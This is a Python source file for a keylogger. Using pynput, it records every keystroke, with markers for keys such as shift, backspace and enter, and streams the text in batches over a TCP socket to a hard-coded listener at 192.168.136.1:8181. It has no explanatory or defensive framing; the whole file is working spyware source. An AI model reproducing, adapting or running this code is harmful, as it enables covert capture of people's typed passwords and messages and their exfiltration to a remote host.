import socket
from pynput import keyboard

port = 8181
server = "192.168.136.1"
address = (server, port)
encrypt_format = 'utf-8'

counter = 0
msg = ""
limit = 20
maxLimit = 30
newLine = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(address)

def send(msg):
    msg = msg.encode(encrypt_format)
    client.send(msg)

def on_press(key):
    global msg
    global counter
    global newLine
    try:
        if '{0}'.format(key.char) != "None":
            msg += '{0}'.format(key.char)
            counter += 1
    except AttributeError:
        if key == key.space:
            msg += " "
            counter += 1
            if counter > 20:
                newLine = True
        elif key == key.shift:
            msg += "<[shift]>"
            counter += 1
        elif key == key.caps_lock:
            msg += "<[Caplock]>"
            counter += 1
        elif key == key.backspace:
            msg += "<[Backspace]>"
            counter += 1
        elif key == key.enter:
            msg += "<[Enter]>"
            counter = limit
            newLine = True

    if counter >= limit and newLine:
        send(msg)
        msg = ""
        counter = 0
        newLine = False
    elif counter == maxLimit:
        send(msg)
        msg = ""
        counter = 0
        newLine = False

def on_release(key):
    global msg
    global counter
    global newLine
    for i in range(0, 10):
        if '{0}'.format(key) == "<" + str(96 + i) + ">":
            msg += str(i)
            counter += 1
            break

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
